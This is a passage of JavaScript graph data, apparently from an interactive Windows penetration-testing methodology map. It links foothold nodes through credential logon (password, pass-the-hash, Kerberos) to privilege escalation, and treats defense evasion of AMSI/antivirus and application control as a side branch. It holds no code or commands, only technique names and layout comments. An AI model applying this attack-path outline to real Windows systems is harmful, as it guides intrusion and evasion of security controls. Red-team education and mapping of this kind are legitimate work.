  { source: 'win-foothold-start', target: 'win-cat-logon', label: 'have a credential' },
  { source: 'win-foothold-start', target: 'win-exec-foothold', label: 'have code execution' },

  { source: 'win-cat-logon', target: 'win-logon-password' },
  { source: 'win-cat-logon', target: 'win-logon-pth' },
  { source: 'win-cat-logon', target: 'win-logon-kerberos' },

  // Every on-ramp technique converges on the Local Foothold, where triage begins.
  { source: 'win-logon-password', target: 'pe-start' },
  { source: 'win-logon-pth', target: 'pe-start' },
  { source: 'win-logon-kerberos', target: 'pe-start' },
  { source: 'win-exec-foothold', target: 'pe-start' },

  // Defense Evasion is a CROSS-CUTTING gate off the Local Foothold, not a lane under
  // code-exec: EDR/AMSI/AppLocker bite whether you logged in with a credential or
  // dropped a shell, and they block priv-esc tooling (winPEAS, Potato, driver loads).
  // The evasion nodes are execution CONSTRAINTS, so they're leaves — not a path to SYSTEM.
  { source: 'pe-start', target: 'win-cat-evasion', label: 'security controls' },
  { source: 'win-cat-evasion', target: 'win-evade-amsi-av' },
  { source: 'win-cat-evasion', target: 'win-evade-appcontrol' },
];
